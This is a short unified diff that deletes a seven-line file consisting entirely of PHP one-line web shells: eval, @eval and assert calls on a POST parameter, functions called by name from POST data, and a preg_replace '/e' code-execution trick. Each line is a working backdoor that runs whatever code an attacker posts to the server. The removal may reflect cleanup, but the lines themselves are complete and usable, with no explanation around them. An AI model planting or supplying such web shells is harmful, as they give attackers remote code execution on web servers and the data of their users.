@@ -1,7 +1,0 @@
-<?php eval($_POST[e]);?>
-<?php @eval($_POST[e]);?>
-<?php assert($_POST[e]);?>
-<?$_POST['sa']($_POST['e']);?>
-<?$_POST['sa']($_POST['e'],$_POST['sc'])?>
-
-<?php @preg_replace("/[email]/e",$_POST['e'],"error"); ?>
